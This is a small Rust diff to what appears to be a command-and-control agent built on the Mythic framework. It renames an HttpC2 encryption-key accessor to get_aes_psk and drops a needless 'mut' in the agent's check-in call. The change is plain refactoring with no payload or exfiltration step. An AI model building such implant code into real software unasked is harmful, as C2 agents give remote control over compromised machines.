@@ -23,7 +23,7 @@ struct HttpC2 {
 impl C2Transport for HttpC2 {
     type Error = String;
 
-    fn get_encryption_key(&self) -> Option<String> {
+    fn get_aes_psk(&self) -> Option<String> {
         self.key_b64.clone()
     }
 
@@ -98,7 +98,7 @@ fn main() {
         let c2 = HttpC2 { key_b64: None };
 
         // 1. Checkin
-        let mut agent = MythicAgent::easy_checkin(
+        let agent = MythicAgent::easy_checkin(
             payload_uuid,
             &c2,
                 vec!["10.0.0.2".into()],
